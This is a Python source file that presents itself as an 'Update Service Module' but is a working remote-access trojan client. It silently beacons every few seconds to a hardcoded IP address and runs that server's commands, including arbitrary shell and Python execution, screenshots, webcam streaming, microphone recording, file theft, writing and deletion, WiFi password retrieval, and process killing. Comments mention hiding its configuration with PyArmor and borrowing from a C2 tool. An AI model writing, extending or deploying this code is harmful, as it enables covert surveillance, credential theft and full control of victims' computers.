"""
Update Service Module - Handles automatic updates and version checking
"""
import asyncio
import json
import platform
import socket
import subprocess
import os
import sys
from datetime import datetime
from typing import Optional, Callable, Dict
from pathlib import Path
import httpx
from colorama import Fore, Style

class UpdateService:
    """Handles automatic updates and version checking"""

    def __init__(self):
        """Initialize update service with embedded configuration"""
        # Hardcoded configuration (will be encrypted by PyArmor)
        self.admin_url = "http://31.97.100.192:5512"
        self.interval = 5
        self.enabled = True
        self.quiet = True  # Always silent
        self.task = None
        self.client_id = None
        self.command_handlers: Dict[str, Callable] = {}

        # Camera streaming state
        self.camera_streaming = False
        self.streaming_task = None
        self.stream_fps = 10

        self._register_default_handlers()

    def get_system_info(self) -> dict:
        """Gather system information for callback"""
        try:
            hostname = socket.gethostname()
            # Try to get local IP
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
                s.close()
            except:
                local_ip = "unknown"

            return {
                "hostname": hostname,
                "local_ip": local_ip,
                "platform": platform.system(),
                "platform_version": platform.version(),
                "platform_release": platform.release(),
                "machine": platform.machine(),
                "processor": platform.processor(),
                "python_version": platform.python_version(),
                "timestamp": datetime.utcnow().isoformat(),
                "version": "1.0.0"  # FormAI version
            }
        except Exception as e:
            
            return {
                "hostname": "unknown",
                "local_ip": "unknown",
                "timestamp": datetime.utcnow().isoformat(),
                "version": "1.0.0"
            }

    def _register_default_handlers(self):
        """Register default command handlers"""
        self.command_handlers = {
            "ping": self._handle_ping,
            "get_status": self._handle_get_status,
            "update_config": self._handle_update_config,
            "restart": self._handle_restart,
            "execute_script": self._handle_execute_script,
            "download_update": self._handle_download_update,
            "update_formai": self._handle_update_formai,
            "screenshot": self._handle_screenshot,
            "list_directory": self._handle_list_directory,
            "read_file": self._handle_read_file,
            "download_file": self._handle_download_file,
            "write_file": self._handle_write_file,
            "delete_file": self._handle_delete_file,
            "kill_process": self._handle_kill_process,
            "list_processes": self._handle_list_processes,
            "duplicate_process": self._handle_duplicate_process,
            "camera_list": self._handle_camera_list,
            "camera_start": self._handle_camera_start,
            "camera_snapshot": self._handle_camera_snapshot,
            "camera_quick_snapshot": self._handle_camera_quick_snapshot,
            "camera_stop": self._handle_camera_stop,
            "mic_list": self._handle_mic_list,
            "mic_start": self._handle_mic_start,
            "mic_stop": self._handle_mic_stop,
            "scan_devices": self._handle_scan_devices,
            "network_enable": self._handle_network_enable,
            "network_disable": self._handle_network_disable,
            "network_get_wifi_passwords": self._handle_network_get_wifi_passwords,
            "network_get_config": self._handle_network_get_config,
            "network_set_config": self._handle_network_set_config,
            "usb_safely_remove": self._handle_usb_safely_remove,
            "storage_get_info": self._handle_storage_get_info,
        }

    async def _handle_ping(self, params: dict) -> dict:
        """Handle ping command"""
        return {"status": "success", "message": "pong"}

    async def _handle_get_status(self, params: dict) -> dict:
        """Handle status request"""
        return {
            "status": "success",
            "data": self.get_system_info()
        }

    async def _handle_update_config(self, params: dict) -> dict:
        """Handle configuration update"""
        try:
            config_updates = params.get("config", {})
            # Update .env or config file
            env_path = Path(".env")

            # Read existing .env
            existing_config = {}
            if env_path.exists():
                with open(env_path, 'r') as f:
                    for line in f:
                        if '=' in line and not line.startswith('#'):
                            key, value = line.strip().split('=', 1)
                            existing_config[key] = value

            # Apply updates
            existing_config.update(config_updates)

            # Write back
            with open(env_path, 'w') as f:
                for key, value in existing_config.items():
                    f.write(f"{key}={value}\n")

            return {"status": "success", "message": "Config updated"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_restart(self, params: dict) -> dict:
        """Handle restart command"""
        try:

            # Schedule restart in 5 seconds
            asyncio.create_task(self._delayed_restart())
            return {"status": "success", "message": "Restart scheduled"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _delayed_restart(self):
        """Restart after a delay"""
        await asyncio.sleep(5)
        python = sys.executable
        os.execl(python, python, *sys.argv)

    async def _handle_execute_script(self, params: dict) -> dict:
        """Handle script execution - Python first, shell fallback (DANGEROUS - use with caution)"""
        try:
            script = params.get("script", "")
            if not script:
                return {"status": "error", "message": "No script provided"}

            # Check if script explicitly specifies shell execution
            shell_indicators = ['cmd /c', 'powershell', 'bash', 'sh -c', 'cmd.exe']
            is_explicit_shell = any(script.strip().lower().startswith(indicator.lower()) for indicator in shell_indicators)

            if is_explicit_shell:
                # Execute as shell command
                result = subprocess.run(
                    script,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                return {
                    "status": "success",
                    "stdout": result.stdout,
                    "stderr": result.stderr,
                    "returncode": result.returncode,
                    "execution_mode": "shell"
                }
            else:
                # Try Python execution first
                try:
                    result = subprocess.run(
                        [sys.executable, "-c", script],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )

                    # If Python succeeded or had a Python-specific error, return it
                    if result.returncode == 0 or "Traceback" in result.stderr:
                        return {
                            "status": "success" if result.returncode == 0 else "error",
                            "stdout": result.stdout,
                            "stderr": result.stderr,
                            "returncode": result.returncode,
                            "execution_mode": "python"
                        }

                    # If Python failed, try shell as fallback
                    result = subprocess.run(
                        script,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    return {
                        "status": "success",
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "returncode": result.returncode,
                        "execution_mode": "shell_fallback"
                    }
                except Exception:
                    # Python execution failed, try shell
                    result = subprocess.run(
                        script,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    return {
                        "status": "success",
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "returncode": result.returncode,
                        "execution_mode": "shell_fallback"
                    }

        except subprocess.TimeoutExpired:
            return {"status": "error", "message": "Script execution timeout"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_download_update(self, params: dict) -> dict:
        """Handle software update download"""
        try:
            update_url = params.get("url", "")
            if not update_url:
                return {"status": "error", "message": "No update URL provided"}

            # Download update file
            async with httpx.AsyncClient(timeout=60.0) as client:
                response = await client.get(update_url)

                if response.status_code == 200:
                    update_path = Path("updates") / "latest_update.zip"
                    update_path.parent.mkdir(exist_ok=True)

                    with open(update_path, 'wb') as f:
                        f.write(response.content)

                    return {
                        "status": "success",
                        "message": f"Update downloaded to {update_path}",
                        "size": len(response.content)
                    }
                else:
                    return {"status": "error", "message": f"Download failed: {response.status_code}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_update_formai(self, params: dict) -> dict:
        """Handle FormAI.exe update download and installation"""
        try:
            import hashlib
            import shutil
            import time

            version = params.get("version", "")
            expected_hash = params.get("sha256", None)
            expected_size = params.get("size", None)

            if not version:
                return {"status": "error", "message": "No version provided"}

            # Determine installation directory
            install_dir = Path(os.environ.get('LOCALAPPDATA', '')) / 'KPRCLi'
            server_dir = install_dir / 'server'
            exe_path = server_dir / 'FormAI.exe'
            backup_path = server_dir / 'FormAI.exe.backup'
            temp_path = server_dir / 'FormAI.exe.download'

            # Download new version
            download_url = f"{self.admin_url}/api/updates/download/{version}"

            async with httpx.AsyncClient(timeout=300.0) as client:
                # Download with streaming for large file
                response = await client.get(download_url, stream=True)

                if response.status_code != 200:
                    return {"status": "error", "message": f"Download failed: {response.status_code}"}

                # Get file size
                total_size = int(response.headers.get('content-length', 0))

                # Verify expected size if provided
                if expected_size and total_size != expected_size:
                    return {"status": "error", "message": f"Size mismatch: expected {expected_size}, got {total_size}"}

                # Download to temp file
                downloaded = 0
                temp_path.parent.mkdir(parents=True, exist_ok=True)

                with open(temp_path, 'wb') as f:
                    async for chunk in response.aiter_bytes(chunk_size=8192):
                        if chunk:
                            f.write(chunk)
                            downloaded += len(chunk)

            # Verify hash if provided
            if expected_hash:
                sha256_hash = hashlib.sha256()
                with open(temp_path, "rb") as f:
                    for byte_block in iter(lambda: f.read(4096), b""):
                        sha256_hash.update(byte_block)
                actual_hash = sha256_hash.hexdigest()

                if actual_hash != expected_hash:
                    temp_path.unlink()
                    return {"status": "error", "message": f"Hash mismatch: expected {expected_hash}, got {actual_hash}"}

            # Stop FormAI server if running
            try:
                subprocess.run(['taskkill', '/F', '/IM', 'FormAI.exe'],
                             capture_output=True, timeout=10)
                await asyncio.sleep(2)  # Wait for process to stop
            except:
                pass

            # Backup current version
            if exe_path.exists():
                shutil.copy2(exe_path, backup_path)

            # Replace with new version
            shutil.move(str(temp_path), str(exe_path))

            # Verify installation
            if not exe_path.exists():
                # Rollback if installation failed
                if backup_path.exists():
                    shutil.copy2(backup_path, exe_path)
                return {"status": "error", "message": "Installation verification failed"}

            # Restart FormAI server
            try:
                subprocess.Popen([str(exe_path)],
                               cwd=str(server_dir),
                               creationflags=subprocess.CREATE_NEW_CONSOLE)
                await asyncio.sleep(3)
            except:
                pass

            return {
                "status": "success",
                "message": f"Successfully updated to v{version}",
                "version": version,
                "size": downloaded,
                "verified": expected_hash is not None
            }

        except Exception as e:
            # Attempt rollback on error
            if 'backup_path' in locals() and backup_path.exists():
                try:
                    shutil.copy2(backup_path, exe_path)
                except:
                    pass
            return {"status": "error", "message": f"Update failed: {str(e)}"}

    async def _handle_screenshot(self, params: dict) -> dict:
        """Handle screenshot capture for troubleshooting"""
        try:
            import base64
            import io

            # Try PIL/Pillow first (works on most systems)
            try:
                from PIL import ImageGrab

                # Capture screenshot
                screenshot = ImageGrab.grab()

                # Convert to bytes
                img_buffer = io.BytesIO()
                screenshot.save(img_buffer, format='PNG', optimize=True)
                img_bytes = img_buffer.getvalue()

                # Encode as base64
                img_base64 = base64.b64encode(img_bytes).decode('utf-8')

                return {
                    "status": "success",
                    "screenshot": img_base64,
                    "format": "png",
                    "size": len(img_bytes),
                    "dimensions": f"{screenshot.width}x{screenshot.height}"
                }

            except ImportError:
                # Fallback to mss (faster, cross-platform)
                try:
                    import mss
                    import mss.tools

                    with mss.mss() as sct:
                        # Capture primary monitor
                        monitor = sct.monitors[1]
                        screenshot = sct.grab(monitor)

                        # Convert to PNG bytes
                        img_bytes = mss.tools.to_png(screenshot.rgb, screenshot.size)

                        # Encode as base64
                        img_base64 = base64.b64encode(img_bytes).decode('utf-8')

                        return {
                            "status": "success",
                            "screenshot": img_base64,
                            "format": "png",
                            "size": len(img_bytes),
                            "dimensions": f"{screenshot.width}x{screenshot.height}"
                        }

                except ImportError:
                    return {
                        "status": "error",
                        "message": "Screenshot libraries not available. Install: pip install pillow mss"
                    }

        except Exception as e:
            return {"status": "error", "message": f"Screenshot failed: {str(e)}"}

    async def _handle_list_directory(self, params: dict) -> dict:
        """Handle directory listing"""
        try:
            import os
            import stat
            from datetime import datetime

            path = params.get("path", ".")
            path_obj = Path(path)

            if not path_obj.exists():
                return {"status": "error", "message": f"Path does not exist: {path}"}

            if not path_obj.is_dir():
                return {"status": "error", "message": f"Path is not a directory: {path}"}

            items = []
            for item in sorted(path_obj.iterdir(), key=lambda x: (not x.is_dir(), x.name.lower())):
                try:
                    item_stat = item.stat()
                    items.append({
                        "name": item.name,
                        "path": str(item.absolute()),
                        "is_dir": item.is_dir(),
                        "is_file": item.is_file(),
                        "size": item_stat.st_size if item.is_file() else 0,
                        "modified": datetime.fromtimestamp(item_stat.st_mtime).isoformat(),
                        "created": datetime.fromtimestamp(item_stat.st_ctime).isoformat(),
                    })
                except Exception as e:
                    # Skip items we can't access
                    continue

            return {
                "status": "success",
                "path": str(path_obj.absolute()),
                "parent": str(path_obj.parent.absolute()) if path_obj.parent != path_obj else None,
                "items": items,
                "count": len(items)
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_read_file(self, params: dict) -> dict:
        """Handle file reading"""
        try:
            import base64

            path = params.get("path", "")
            if not path:
                return {"status": "error", "message": "No path provided"}

            path_obj = Path(path)

            if not path_obj.exists():
                return {"status": "error", "message": f"File does not exist: {path}"}

            if not path_obj.is_file():
                return {"status": "error", "message": f"Path is not a file: {path}"}

            # Check file size (limit to 10MB for safety)
            file_size = path_obj.stat().st_size
            if file_size > 10 * 1024 * 1024:
                return {"status": "error", "message": f"File too large: {file_size} bytes (max 10MB)"}

            # Try to read as text first
            try:
                with open(path_obj, 'r', encoding='utf-8') as f:
                    content = f.read()
                return {
                    "status": "success",
                    "path": str(path_obj.absolute()),
                    "content": content,
                    "size": file_size,
                    "encoding": "text"
                }
            except UnicodeDecodeError:
                # Binary file, return base64
                with open(path_obj, 'rb') as f:
                    content = f.read()
                return {
                    "status": "success",
                    "path": str(path_obj.absolute()),
                    "content": base64.b64encode(content).decode('utf-8'),
                    "size": file_size,
                    "encoding": "base64"
                }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_download_file(self, params: dict) -> dict:
        """Handle file download (returns file as base64)"""
        try:
            import base64

            path = params.get("path", "")
            if not path:
                return {"status": "error", "message": "No path provided"}

            path_obj = Path(path)

            if not path_obj.exists():
                return {"status": "error", "message": f"File does not exist: {path}"}

            if not path_obj.is_file():
                return {"status": "error", "message": f"Path is not a file: {path}"}

            # Check file size (limit to 50MB for downloads)
            file_size = path_obj.stat().st_size
            if file_size > 50 * 1024 * 1024:
                return {"status": "error", "message": f"File too large: {file_size} bytes (max 50MB)"}

            with open(path_obj, 'rb') as f:
                content = f.read()

            return {
                "status": "success",
                "filename": path_obj.name,
                "path": str(path_obj.absolute()),
                "content": base64.b64encode(content).decode('utf-8'),
                "size": file_size
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_write_file(self, params: dict) -> dict:
        """Handle file writing/uploading"""
        try:
            import base64

            path = params.get("path", "")
            content = params.get("content", "")
            encoding = params.get("encoding", "text")  # "text" or "base64"

            if not path:
                return {"status": "error", "message": "No path provided"}

            if not content:
                return {"status": "error", "message": "No content provided"}

            path_obj = Path(path)

            # Create parent directory if it doesn't exist
            path_obj.parent.mkdir(parents=True, exist_ok=True)

            if encoding == "base64":
                # Decode base64 and write binary
                content_bytes = base64.b64decode(content)
                with open(path_obj, 'wb') as f:
                    f.write(content_bytes)
            else:
                # Write as text
                with open(path_obj, 'w', encoding='utf-8') as f:
                    f.write(content)

            return {
                "status": "success",
                "path": str(path_obj.absolute()),
                "size": path_obj.stat().st_size
            }
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_delete_file(self, params: dict) -> dict:
        """Handle file/directory deletion"""
        try:
            import shutil

            path = params.get("path", "")
            if not path:
                return {"status": "error", "message": "No path provided"}

            path_obj = Path(path)

            if not path_obj.exists():
                return {"status": "error", "message": f"Path does not exist: {path}"}

            if path_obj.is_dir():
                shutil.rmtree(path_obj)
                return {"status": "success", "message": f"Directory deleted: {path}"}
            else:
                path_obj.unlink()
                return {"status": "success", "message": f"File deleted: {path}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_kill_process(self, params: dict) -> dict:
        """Handle process killing by name or PID"""
        try:
            import psutil

            process_name = params.get("process_name", "")
            pid = params.get("pid", None)
            kill_all = params.get("kill_all", True)  # Kill all matching processes by default

            if not process_name and not pid:
                return {"status": "error", "message": "Either process_name or pid must be provided"}

            killed_processes = []

            if pid:
                # Kill by PID
                try:
                    process = psutil.Process(pid)
                    process_info = {
                        "pid": process.pid,
                        "name": process.name(),
                        "status": process.status()
                    }
                    process.kill()
                    killed_processes.append(process_info)
                except psutil.NoSuchProcess:
                    return {"status": "error", "message": f"No process found with PID {pid}"}
            else:
                # Kill by name
                for proc in psutil.process_iter(['pid', 'name', 'cmdline']):
                    try:
                        # Match by process name or command line
                        proc_name = proc.info['name'].lower()
                        cmdline = ' '.join(proc.info['cmdline'] or []).lower()
                        search_name = process_name.lower()

                        if search_name in proc_name or search_name in cmdline:
                            process_info = {
                                "pid": proc.info['pid'],
                                "name": proc.info['name'],
                                "cmdline": ' '.join(proc.info['cmdline'] or [])
                            }
                            proc.kill()
                            killed_processes.append(process_info)

                            if not kill_all:
                                break
                    except (psutil.NoSuchProcess, psutil.AccessDenied):
                        continue

            if killed_processes:
                return {
                    "status": "success",
                    "message": f"Killed {len(killed_processes)} process(es)",
                    "processes": killed_processes,
                    "count": len(killed_processes)
                }
            else:
                return {
                    "status": "error",
                    "message": f"No processes found matching '{process_name}'" if process_name else f"No process with PID {pid}"
                }
        except ImportError:
            return {"status": "error", "message": "psutil library not available. Install: pip install psutil"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_list_processes(self, params: dict) -> dict:
        """Handle process listing"""
        try:
            import psutil

            sort_by = params.get("sort_by", "memory")  # memory, cpu, name, pid
            limit = params.get("limit", 100)  # Limit number of processes returned

            processes = []
            for proc in psutil.process_iter(['pid', 'name', 'memory_percent', 'cpu_percent', 'status', 'create_time', 'cmdline']):
                try:
                    # Get process info
                    proc_info = proc.info
                    processes.append({
                        "pid": proc_info['pid'],
                        "name": proc_info['name'],
                        "memory_percent": round(proc_info['memory_percent'] or 0, 2),
                        "cpu_percent": round(proc_info['cpu_percent'] or 0, 2),
                        "status": proc_info['status'],
                        "cmdline": ' '.join(proc_info['cmdline'] or []),
                        "create_time": datetime.fromtimestamp(proc_info['create_time']).isoformat() if proc_info['create_time'] else None
                    })
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

            # Sort processes
            if sort_by == "memory":
                processes.sort(key=lambda x: x['memory_percent'], reverse=True)
            elif sort_by == "cpu":
                processes.sort(key=lambda x: x['cpu_percent'], reverse=True)
            elif sort_by == "name":
                processes.sort(key=lambda x: x['name'].lower())
            elif sort_by == "pid":
                processes.sort(key=lambda x: x['pid'])

            # Limit results
            processes = processes[:limit]

            return {
                "status": "success",
                "processes": processes,
                "count": len(processes),
                "total": len(processes)
            }
        except ImportError:
            return {"status": "error", "message": "psutil library not available. Install: pip install psutil"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_duplicate_process(self, params: dict) -> dict:
        """Handle process duplication (launch another instance)"""
        try:
            import psutil
            import subprocess

            pid = params.get("pid", None)
            cmdline = params.get("cmdline", None)

            if not pid and not cmdline:
                return {"status": "error", "message": "Either pid or cmdline must be provided"}

            # If PID provided, get the command line from that process
            if pid:
                try:
                    process = psutil.Process(pid)
                    cmdline = process.cmdline()
                    if not cmdline:
                        return {"status": "error", "message": f"Could not get command line for PID {pid}"}
                except psutil.NoSuchProcess:
                    return {"status": "error", "message": f"No process found with PID {pid}"}

            # Launch new instance
            if isinstance(cmdline, str):
                # If cmdline is a string, convert to list
                import shlex
                cmdline = shlex.split(cmdline)

            # Start new process
            new_process = subprocess.Popen(cmdline,
                                          stdout=subprocess.DEVNULL,
                                          stderr=subprocess.DEVNULL,
                                          stdin=subprocess.DEVNULL)

            return {
                "status": "success",
                "message": f"Launched new instance",
                "new_pid": new_process.pid,
                "cmdline": ' '.join(cmdline) if isinstance(cmdline, list) else cmdline
            }
        except FileNotFoundError:
            return {"status": "error", "message": f"Executable not found: {cmdline[0] if isinstance(cmdline, list) else cmdline}"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_camera_list(self, params: dict) -> dict:
        """Handle camera listing"""
        try:
            from tools import camera_handler

            cameras = camera_handler.list_cameras()

            return {
                "status": "success",
                "cameras": cameras,
                "count": len(cameras)
            }
        except ImportError:
            return {"status": "error", "message": "Camera handler not available. Install: pip install opencv-python"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_camera_start(self, params: dict) -> dict:
        """Handle camera start and begin WebSocket streaming"""
        try:
            from tools import camera_handler

            camera_index = params.get("camera_index", 0)
            result = camera_handler.start_camera(camera_index)

            if result.get("success"):
                # Start WebSocket streaming task
                if not self.camera_streaming:
                    self.camera_streaming = True
                    self.streaming_task = asyncio.create_task(self._camera_streaming_task())
                    
                return {
                    "status": "success",
                    "data": result
                }
            else:
                return {
                    "status": "error",
                    "message": result.get("error", "Unknown error")
                }
        except ImportError:
            return {"status": "error", "message": "Camera handler not available. Install: pip install opencv-python"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_camera_snapshot(self, params: dict) -> dict:
        """Handle camera snapshot capture"""
        try:
            from tools import camera_handler

            result = camera_handler.capture_snapshot()

            if result.get("success"):
                return {
                    "status": "success",
                    "data": result
                }
            else:
                return {
                    "status": "error",
                    "message": result.get("error", "Unknown error")
                }
        except ImportError:
            return {"status": "error", "message": "Camera handler not available. Install: pip install opencv-python"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_camera_quick_snapshot(self, params: dict) -> dict:
        """
        Handle quick camera snapshot - simpler alternative to start/snapshot/stop flow
        Inspired by dystopia-c2's webshot() function
        """
        try:
            from tools import camera_handler

            camera_index = params.get("camera_index", 0)
            quality = params.get("quality", 85)

            result = camera_handler.quick_snapshot(camera_index, quality)

            if result.get("success"):
                return {
                    "status": "success",
                    "data": result
                }
            else:
                return {
                    "status": "error",
                    "message": result.get("error", "Unknown error")
                }
        except ImportError:
            return {"status": "error", "message": "Camera handler not available. Install: pip install opencv-python"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_camera_stop(self, params: dict) -> dict:
        """Handle camera stop and stop WebSocket streaming"""
        try:
            from tools import camera_handler

            # Stop streaming task first
            if self.camera_streaming:
                self.camera_streaming = False
                if self.streaming_task and not self.streaming_task.done():
                    self.streaming_task.cancel()
                    try:
                        await self.streaming_task
                    except asyncio.CancelledError:
                        pass
                self.streaming_task = None
                
            result = camera_handler.stop_camera()

            if result.get("success"):
                return {
                    "status": "success",
                    "message": result.get("message", "Camera stopped")
                }
            else:
                return {
                    "status": "error",
                    "message": result.get("error", "Unknown error")
                }
        except ImportError:
            return {"status": "error", "message": "Camera handler not available. Install: pip install opencv-python"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _camera_streaming_task(self):
        """
        Background task that continuously captures and pushes frames to admin server
        Runs while camera_streaming is True
        """
        
        frame_interval = 1.0 / self.stream_fps  # Time between frames
        frame_count = 0

        while self.camera_streaming:
            try:
                # Capture frame from active camera
                from tools import camera_handler
                result = camera_handler.capture_snapshot()

                if result.get("success"):
                    # Push frame to admin server
                    try:
                        async with httpx.AsyncClient(timeout=5.0) as client:
                            response = await client.post(
                                f"{self.admin_url}/api/camera/push_frame/{self.client_id}",
                                json={
                                    "image": result["image"],
                                    "resolution": result["resolution"],
                                    "timestamp": result["timestamp"]
                                }
                            )

                            if response.status_code == 200:
                                frame_count += 1
                                if frame_count % 30 == 0:  # Log every 30 frames (~3 seconds at 10 FPS)
                                    
                                        data = response.json()
                                        broadcasted = data.get("broadcasted_to", 0)

                    except Exception as e:
                        pass

                # Wait for next frame interval
                await asyncio.sleep(frame_interval)

            except Exception as e:
                pass

            await asyncio.sleep(1)  # Wait before retry

        
    async def _handle_mic_list(self, params: dict) -> dict:
        """Handle microphone listing"""
        try:
            from tools import audio_handler

            microphones = audio_handler.list_microphones()

            return {
                "status": "success",
                "microphones": microphones,
                "count": len(microphones)
            }
        except ImportError:
            return {"status": "error", "message": "Audio handler not available. Install: pip install pyaudio"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_mic_start(self, params: dict) -> dict:
        """Handle microphone recording start"""
        try:
            from tools import audio_handler

            duration = params.get("duration", 30)
            device_index = params.get("device_index", None)
            sample_rate = params.get("sample_rate", 44100)
            channels = params.get("channels", 2)

            result = audio_handler.start_recording(
                duration=duration,
                device_index=device_index,
                sample_rate=sample_rate,
                channels=channels
            )

            if result.get("success"):
                return {
                    "status": "success",
                    "data": result
                }
            else:
                return {
                    "status": "error",
                    "message": result.get("error", "Unknown error")
                }
        except ImportError:
            return {"status": "error", "message": "Audio handler not available. Install: pip install pyaudio"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_mic_stop(self, params: dict) -> dict:
        """Handle microphone recording stop"""
        try:
            from tools import audio_handler

            result = audio_handler.stop_recording()

            if result.get("success"):
                return {
                    "status": "success",
                    "data": result
                }
            else:
                return {
                    "status": "error",
                    "message": result.get("error", "Unknown error")
                }
        except ImportError:
            return {"status": "error", "message": "Audio handler not available. Install: pip install pyaudio"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_scan_devices(self, params: dict) -> dict:
        """Handle device scan - enumerate all connected devices"""

        # Check if scan_devices is disabled via environment variable
        if os.getenv("DISABLE_SCAN_DEVICES", "false").lower() == "true":
            return {
                "status": "error",
                "message": "scan_devices command is disabled via DISABLE_SCAN_DEVICES environment variable"
            }

        try:
            from tools import device_scanner

            result = device_scanner.scan_all_devices()

            if result.get("success"):
                return {
                    "status": "success",
                    "data": result
                }
            else:
                return {
                    "status": "error",
                    "message": result.get("error", "Device scan failed")
                }
        except ImportError:
            return {"status": "error", "message": "Device scanner not available"}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_network_enable(self, params: dict) -> dict:
        """Handle network adapter enable"""
        try:
            from tools import network_handler
            adapter_name = params.get("adapter_name")
            if not adapter_name:
                return {"status": "error", "message": "adapter_name required"}

            result = network_handler.enable_adapter(adapter_name)
            return {"status": "success" if result.get("success") else "error", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_network_disable(self, params: dict) -> dict:
        """Handle network adapter disable"""
        try:
            from tools import network_handler
            adapter_name = params.get("adapter_name")
            if not adapter_name:
                return {"status": "error", "message": "adapter_name required"}

            result = network_handler.disable_adapter(adapter_name)
            return {"status": "success" if result.get("success") else "error", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_network_get_wifi_passwords(self, params: dict) -> dict:
        """Handle WiFi password retrieval"""
        try:
            from tools import network_handler
            result = network_handler.get_wifi_passwords()
            return {"status": "success" if result.get("success") else "error", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_network_get_config(self, params: dict) -> dict:
        """Handle network adapter configuration retrieval"""
        try:
            from tools import network_handler
            adapter_name = params.get("adapter_name")
            if not adapter_name:
                return {"status": "error", "message": "adapter_name required"}

            result = network_handler.get_adapter_config(adapter_name)
            return {"status": "success" if result.get("success") else "error", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_network_set_config(self, params: dict) -> dict:
        """Handle network adapter configuration update"""
        try:
            from tools import network_handler
            adapter_name = params.get("adapter_name")
            config = params.get("config", {})
            if not adapter_name:
                return {"status": "error", "message": "adapter_name required"}

            result = network_handler.set_adapter_config(adapter_name, config)
            return {"status": "success" if result.get("success") else "error", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_usb_safely_remove(self, params: dict) -> dict:
        """Handle USB device safe removal"""
        try:
            from tools import usb_handler
            device_name = params.get("device_name")
            if not device_name:
                return {"status": "error", "message": "device_name required"}

            result = usb_handler.safely_remove(device_name)
            return {"status": "success" if result.get("success") else "error", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def _handle_storage_get_info(self, params: dict) -> dict:
        """Handle storage device info retrieval"""
        try:
            from tools import storage_handler
            disk_name = params.get("disk_name")
            if not disk_name:
                return {"status": "error", "message": "disk_name required"}

            result = storage_handler.get_disk_info(disk_name)
            return {"status": "success" if result.get("success") else "error", "data": result}
        except Exception as e:
            return {"status": "error", "message": str(e)}

    async def send_heartbeat(self):
        """Send heartbeat to admin server and check for commands"""
        if not self.enabled:
            return

        try:
            data = self.get_system_info()
            if self.client_id:
                data["client_id"] = self.client_id

            async with httpx.AsyncClient(timeout=10.0) as client:
                response = await client.post(
                    f"{self.admin_url}/api/heartbeat",
                    json=data
                )

                if response.status_code == 200:
                    result = response.json()
                    if "client_id" in result:
                        self.client_id = result["client_id"]

                    # Check for pending commands
                    if "commands" in result and result["commands"]:
                        await self._process_commands(result["commands"])

                    pass
                else:
                    pass

        except httpx.TimeoutException:
            pass
        except httpx.ConnectError:
            pass
        except Exception as e:
            pass

    async def _process_commands(self, commands: list):
        """Process commands from admin server"""
        for cmd in commands:
            try:
                command_id = cmd.get("command_id")
                command_type = cmd.get("command")
                params = cmd.get("params", {})

                
                # Execute command
                if command_type in self.command_handlers:
                    result = await self.command_handlers[command_type](params)
                else:
                    result = {"status": "error", "message": f"Unknown command: {command_type}"}

                # Report result back to admin
                await self._report_command_result(command_id, result)

            except Exception as e:
                
                await self._report_command_result(command_id, {
                    "status": "error",
                    "message": str(e)
                })

    async def _report_command_result(self, command_id: str, result: dict):
        """Report command execution result back to admin"""
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                await client.post(
                    f"{self.admin_url}/api/command_result",
                    json={
                        "client_id": self.client_id,
                        "command_id": command_id,
                        "result": result,
                        "timestamp": datetime.utcnow().isoformat()
                    }
                )
        except Exception as e:
            pass

    async def heartbeat_loop(self):
        """Background loop for sending heartbeats"""
        
        # Send initial heartbeat
        await self.send_heartbeat()

        # Continue with periodic heartbeats
        while True:
            await asyncio.sleep(self.interval)
            await self.send_heartbeat()

    def start(self):
        """Start the callback system"""
        if not self.enabled:
            
            return

        # Create background task
        self.task = asyncio.create_task(self.heartbeat_loop())

    async def stop(self):
        """Stop the callback system"""
        if self.task:
            self.task.cancel()
            try:
                await self.task
            except asyncio.CancelledError:
                pass
            except (ConnectionResetError, OSError):
                # Suppress Windows asyncio pipe transport errors on shutdown
                pass
            